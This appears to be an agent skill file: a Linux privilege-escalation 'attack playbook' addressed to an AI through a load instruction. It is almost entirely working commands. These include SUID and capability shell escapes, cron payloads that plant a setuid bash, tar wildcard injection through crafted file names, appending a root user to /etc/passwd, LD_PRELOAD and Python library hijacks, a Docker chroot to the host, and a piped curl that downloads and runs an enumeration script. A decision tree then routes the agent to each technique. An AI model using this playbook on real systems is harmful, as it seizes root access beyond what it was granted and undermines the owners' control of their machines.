---
name: linux-privilege-escalation
description: >-
  Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems.
---

# SKILL: Linux Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking.

## 0. RELATED ROUTING

- [container-escape-techniques](../container-escape-techniques/SKILL.md) when target is a container
- [linux-security-bypass](../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after obtaining root for pivoting

### Advanced Reference
- [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) — Top 30 SUID binaries, capability exploitation
- [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) — Kernel version -> exploit mapping

---

## 1. ENUMERATION CHECKLIST

```bash
uname -a && cat /etc/os-release
id && whoami && hostname

sudo -l
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
getcap -r / 2>/dev/null

cat /etc/crontab && ls -la /etc/cron.*
systemctl list-timers --all

find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow

ss -tlnp && ps aux
env
cat ~/.bash_history
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID EXPLOITATION

### Quick-Win SUID Escalations

| Binary | Command |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` -> `!/bin/sh` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |

### Shared Library Hijacking (SUID Binary)

```bash
ldd /usr/local/bin/suid_binary
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"
# evil.c: __attribute__((constructor)) -> setuid(0); system("/bin/bash -p")
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
```

---

## 3. CAPABILITIES ABUSE

| Capability | Risk | Exploitation |
|---|---|---|
| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **Critical** | Read/write any file |
| `cap_dac_read_search` | **High** | Dump `/etc/shadow` |
| `cap_sys_admin` | **Critical** | Mount, BPF, namespace manipulation |
| `cap_sys_ptrace` | **High** | Inject into root processes |

```bash
getcap -r / 2>/dev/null
```

---

## 4. CRON / TIMER ABUSE

```bash
# Writable cron script:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh

# PATH hijacking in cron (relative command without full path):
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh

# Wildcard injection (tar czf /backup/archive.tar.gz *):
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"

# Monitor processes:
./pspy64
```

---

## 5. NFS NO_ROOT_SQUASH

```bash
showmount -e TARGET_IP
mount -t nfs TARGET_IP:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
# On target: /share/bash -p
```

---

## 6. WRITABLE /etc/passwd OR /etc/shadow

```bash
openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Shadow:
mkpasswd -m sha-512 password123
# Replace root's hash
```

---

## 7. LD_PRELOAD WITH SUDO

```bash
# sudo -l shows: env_keep+=LD_PRELOAD
# Compile .so with _init() that calls setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER GROUP -> ROOT

```bash
id  # check for "docker" in groups
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 9. PYTHON / PERL LIBRARY HIJACKING

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
# Place malicious module in writable path that comes first:
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF
```

---

## 10. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **LinPEAS** | Comprehensive enumeration | `curl -L .../linpeas.sh \| sh` |
| **linux-exploit-suggester** | Kernel exploits | `./linux-exploit-suggester.sh` |
| **pspy** | Monitor processes | `./pspy64` |
| **GTFOBins** | SUID/sudo reference | https://gtfobins.github.io/ |

---

## 11. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell obtained
|
|-- sudo -l shows entries?
|   |-- GTFOBins match? -> exploit directly
|   |-- env_keep has LD_PRELOAD? -> LD_PRELOAD hijack (S7)
|   +-- NOPASSWD on custom script? -> review script for injection
|
|-- SUID/SGID binaries found?
|   |-- Standard binary on GTFOBins? -> SUID exploit (S2)
|   +-- Custom binary? -> reverse engineer, check libs
|
|-- Capabilities on binaries?
|   |-- cap_setuid? -> instant root (S3)
|   |-- cap_dac_override? -> write /etc/passwd (S6)
|   +-- cap_sys_ptrace? -> process injection
|
|-- Cron jobs running as root?
|   |-- Writable script? -> inject payload (S4)
|   |-- Missing full path? -> PATH hijack (S4)
|   +-- Uses wildcards? -> wildcard injection (S4)
|
|-- Writable sensitive files?
|   |-- /etc/passwd? -> add root user (S6)
|   +-- systemd unit files? -> add ExecStartPre
|
|-- Docker/LXD group membership? -> mount host filesystem (S8)
|-- NFS shares with no_root_squash? -> SUID binary via NFS (S5)
|-- Kernel version old/unpatched? -> check KERNEL_EXPLOITS_CHECKLIST.md
+-- None of above? -> LinPEAS + pspy
```
